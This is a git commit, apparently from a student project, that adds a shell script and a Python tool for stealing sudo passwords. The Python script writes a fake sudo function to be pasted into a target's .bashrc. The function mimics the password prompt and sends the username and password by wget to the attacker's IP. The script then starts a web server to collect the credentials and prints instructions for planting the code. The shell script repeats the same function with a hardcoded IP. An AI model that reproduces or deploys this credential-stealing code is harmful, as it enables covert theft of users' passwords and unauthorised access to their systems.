2e0b78c81c4ab02e38b4fa832322a4d4b1f22644
Alex Grant <acg6097@rit.edu>
2021-04-14 19:07:52 -0400

    Inital commit

---
+++ install.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+echo 'function sudo(){
+origsudo="$(which sudo)";
+read -s -p "[sudo] password for $USER: " pw;printf "\n";
+wget "192.168.169.128 /$USER:$pw" > /dev/null 2>&1;
+$origsudo $@;
+}' >> test.txt
---
+++ pwgrab.py
@@ -0,0 +1,54 @@
+import os
+import subprocess as s
+
+def main():
+	#This function creates a script that edits .bashrc
+	#on a target box once run on it so that anytime
+	#someone uses the 'sudo' command, it sends an http
+	#request to a server that is also hosted on the attacking
+	#box with the username and password
+
+	#Printing notice
+	input("[!] THIS SHOULD BE RUN ON ATTACKING MACHINE(hit enter to continue)")
+
+	#Grabbing ip of attacking box
+	ip = s.getoutput("hostname -I")
+	print("[*] Hosting web server on: " + str(ip))
+
+	#Create sell script to be put on target box
+	print("[*] Output file: .bashhrc")
+	if os.path.exists(".bashhrc"):
+		os.remove(".bashhrc")
+	f = open(".bashhrc", "x")
+	
+	#Defining function
+	f.write('function sudo(){\norigsudo="$(which sudo)";\n')
+
+	#Giving prompt and storing password in pw var
+	f.write('read -s -p "[sudo] password for $USER: " pw;printf "\\n";\n')
+
+	#Creating web request
+	f.write('wget "')
+	f.write(str(ip))
+	f.write('/$USER:$pw" > /dev/null 2>&1;\n')
+
+	#Executing original command
+	f.write("$origsudo $@;\n")
+	
+	#Closing function
+	f.write("}")
+	f.close()
+
+	#Printing user instructions
+	print("[!] INSTRUCTIONS:")
+	print("[!]\t1. Copy contents of .bashhrc in this directory")
+	print("[!]\t2. Paste at end of .bashrc file on TARGET machine")
+	print("[!]\t3. Run '. ~/.bashrc'")
+
+	print("[*] Starting Web Server to listen for credentials...")
+
+	#Starting up web server to recieve credentials
+	os.system("sudo python3 -m http.server 80 --bind " + ip)
+
+
+main()
